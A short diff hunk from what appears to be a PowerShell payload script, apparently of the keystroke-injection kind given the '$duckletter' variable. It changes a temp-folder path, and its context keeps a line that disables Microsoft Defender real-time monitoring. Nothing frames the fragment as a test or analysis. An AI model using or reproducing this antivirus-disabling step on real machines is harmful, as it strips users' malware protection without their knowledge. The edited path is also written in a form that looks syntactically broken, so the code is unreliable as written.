@@ -3,7 +3,7 @@
 
 
 
-$duckletter = $env:TEMP
+$duckletter = $env:TEMP\Cache
 
 Set-MpPreference -DisableRealtimeMonitoring $true
 
